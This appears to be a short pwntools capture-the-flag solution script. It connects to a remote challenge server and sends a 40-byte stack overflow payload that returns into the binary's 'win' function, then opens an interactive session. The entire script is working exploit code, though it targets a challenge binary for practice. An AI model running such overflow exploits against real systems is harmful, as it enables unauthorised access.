from pwn import *

elf = ELF('./chall')
#io = process(elf.path)
io = remote('34.170.146.252', 21931)

payload = b'a' * 40
payload += p64(elf.sym['win'])

io.sendlineafter(b'value: ', payload)
io.interactive()

